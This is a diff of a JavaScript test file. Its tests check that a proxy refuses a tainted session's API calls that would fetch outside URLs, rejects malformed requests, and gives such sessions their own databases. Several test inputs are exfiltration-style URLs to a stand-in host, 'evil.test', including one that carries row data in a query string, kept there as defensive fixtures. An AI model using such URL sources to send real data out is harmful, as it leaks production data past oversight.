@@ -108,11 +108,18 @@ test('a tainted session\'s call that would have Anthropic reach the internet is 
     { ...plain, tools: [{ type: 'web_fetch_20250910', name: 'web_fetch' }] },
     { ...plain, mcp_servers: [{ type: 'url', url: 'https://evil.test/mcp', name: 'x' }] },
     { requests: [{ custom_id: 'a', params: { ...plain, tools: [{ type: 'web_search_20260101' }] } }] },
+    { ...plain, messages: [{ role: 'user', content: [{ type: 'image', source: { type: 'url', url: 'https://evil.test/?d=row' } }] }] },
+    { ...plain, messages: [{ role: 'user', content: [{ type: 'tool_result', tool_use_id: 't', content: [{ type: 'document', source: { type: 'URL', url: 'https://evil.test/' } }] }] }] },
   ]) {
     const refused = await call(reach);
     assert.equal(refused.status, 403);
     assert.match((await refused.json()).error.message, /production data/);
   }
+  // A call the console cannot read is not sent either.
+  const notJson = await fetch(`${base}/anthropic/v1/messages`, { method: 'POST', headers: { 'content-type': 'text/plain', authorization: 'Bearer tok' }, body: JSON.stringify(plain) });
+  assert.equal(notJson.status, 415);
+  const broken = await fetch(`${base}/anthropic/v1/messages`, { method: 'POST', headers: { 'content-type': 'application/json', authorization: 'Bearer tok' }, body: '{"model":' });
+  assert.equal(broken.status, 400);
   assert.equal(upstreamSeen.length, 1);
   assert.equal(serverSideReach(plain), null);
 });
@@ -122,4 +129,19 @@ test('a tainted session\'s app opens for its owner alone, whatever was shared', 
   assert.equal(canOpenApp(session, 'joel', null, true), true);
   assert.equal(canOpenApp(session, 'ana', null, true), false);
   assert.equal(canOpenApp({ ...session, taintedAt: undefined }, 'ana', null, true), true);
+});
+
+test('a session that may use production is handed its own databases, never its owner\'s', async (t) => {
+  quietly(t);
+  const sessions = [{ id: 'cccc3333', token: 'tok-c', status: 'running', owner: 'joel', ownDatabases: true }];
+  const own = { status: 'ready', database: { user: 'woodshed__cccc3333', password: 'p', name: 'woodshed__cccc3333' }, error: null };
+  const databases = { available: true, async sessionDatabase(id) { return id === 'cccc3333' ? own : null; }, async credentials() { throw new Error('the owner\'s databases were asked for'); } };
+  const userSettings = { claudeToken: async () => 'sk-ant-oat01-x', ownFiles: async () => ({}), view: () => ({}), gitIdentity: () => ({}), limitsFor: () => null };
+  const base = await serve(t, createSessionApi({ fleet: { sessions: () => sessions }, tokens: null, userSettings, databases }));
+  const answer = await fetch(`${base}/settings`, { method: 'POST', headers: { authorization: 'Bearer tok-c' } });
+  assert.equal(answer.status, 200);
+  assert.equal((await answer.json()).database.name, 'woodshed__cccc3333');
+  own.status = 'working';
+  own.database = null;
+  assert.equal((await fetch(`${base}/settings`, { method: 'POST', headers: { authorization: 'Bearer tok-c' } })).status, 503);
 });
